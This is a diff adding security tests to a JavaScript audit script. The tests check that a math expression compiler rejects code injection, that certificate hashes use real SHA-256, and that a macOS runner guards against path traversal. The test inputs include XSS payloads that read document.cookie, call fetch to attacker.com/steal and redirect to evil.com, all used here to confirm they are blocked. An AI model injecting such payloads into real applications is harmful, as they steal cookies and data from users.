@@ -447,6 +447,50 @@ assert(shopContent.includes('downloadCertificate'), 'shop_controller.js implemen
 assert(shopContent.includes('Hahnemühle Photo Rag 308') && shopContent.includes('UltraChrome Pro12'), 'shop_controller.js certifica sustratos de grado museo (Hahnemühle 308g & UltraChrome Pro12)');
 
 // ─────────────────────────────────────────────────────────────────────────────
+// 8. AUDITORÍA DE CIBERSEGURIDAD DETERMINISTA (TIMONEL F2 PREFRONTAL)
+// ─────────────────────────────────────────────────────────────────────────────
+console.log('\n🛡️ FASE 8: Ciberseguridad Determinista (Anti-XSS, SHA-256 Real & App Sandbox)');
+
+// 1. Verificación de Inmunidad XSS/RCE en JITMathCompiler
+const jitPath = path.join(rootDir, 'js', 'jit_compiler.js');
+assert(fs.existsSync(jitPath), 'Módulo jit_compiler.js existe en disco');
+const jitCode = fs.readFileSync(jitPath, 'utf8');
+assert(!jitCode.includes('new Function') && !jitCode.includes('eval('), 'jit_compiler.js erradica totalmente new Function y eval (Cero riesgo de RCE/XSS)');
+
+const { instance: jitEngine } = require(jitPath);
+assert(jitEngine && typeof jitEngine.compile === 'function', 'JITMathCompiler expone método compile');
+
+// Evaluación legítima de campos matemáticos
+const testFn1 = jitEngine.compile('-y', ['x', 'y', 't']);
+assert(testFn1(1, 4, 0) === -4, 'JITMathCompiler compila y evalúa con precisión campo lineal -y');
+
+const testFn2 = jitEngine.compile('2*x*y + cos(t)', ['x', 'y', 't']);
+assert(Math.abs(testFn2(2, 3, 0) - 13) < 1e-9, 'JITMathCompiler compila y evalúa combinaciones trigonométricas no lineales');
+
+// Resistencia a vectores maliciosos de inyección de código
+const malAttack1 = jitEngine.compile('1); alert(document.cookie); (', ['x', 'y', 't']);
+assert(malAttack1(1, 1, 1) === 0, 'JITMathCompiler rechaza de raíz inyección XSS con alert() devolviendo fallback seguro 0');
+
+const malAttack2 = jitEngine.compile('fetch("https://attacker.com/steal")', ['x', 'y', 't']);
+assert(malAttack2(1, 1, 1) === 0, 'JITMathCompiler rechaza de raíz inyección XSS con fetch() devolviendo fallback seguro 0');
+
+const malAttack3 = jitEngine.compile('window.location="http://evil.com"', ['x', 'y', 't']);
+assert(malAttack3(1, 1, 1) === 0, 'JITMathCompiler rechaza de raíz acceso a identificadores no autorizados');
+
+// 2. Verificación de Huella Criptográfica Auténtica SHA-256 en Certificados
+assert(!shopContent.includes('Math.random()*16'), 'shop_controller.js erradica hashes falsos generados con Math.random()');
+assert(shopContent.includes('SHA-256') && (shopContent.includes('subtle.digest') || shopContent.includes('crypto.createHash')), 'shop_controller.js implementa cálculo real y auditable de hash criptográfico SHA-256');
+
+// 3. Verificación de Protección Path Traversal y ATS en el Runner Nativo macOS
+const mainSwiftPath = path.join(desktopDir, 'main.swift');
+const mainSwiftContent = fs.readFileSync(mainSwiftPath, 'utf8');
+assert(mainSwiftContent.includes('lastPathComponent'), 'desktop/main.swift sanitiza nombres de archivo con lastPathComponent contra Path Traversal');
+
+const infoPlistPath = path.join(desktopDir, 'Info.plist');
+const infoPlistContent = fs.readFileSync(infoPlistPath, 'utf8');
+assert(!infoPlistContent.includes('NSAllowsArbitraryLoads'), 'desktop/Info.plist prohíbe conexiones HTTP en texto plano (ATS estricto activo)');
+
+// ─────────────────────────────────────────────────────────────────────────────
 // RESUMEN FINAL DE CERTIFICACIÓN
 // ─────────────────────────────────────────────────────────────────────────────
 console.log('\n═══════════════════════════════════════════════════════════════════════');
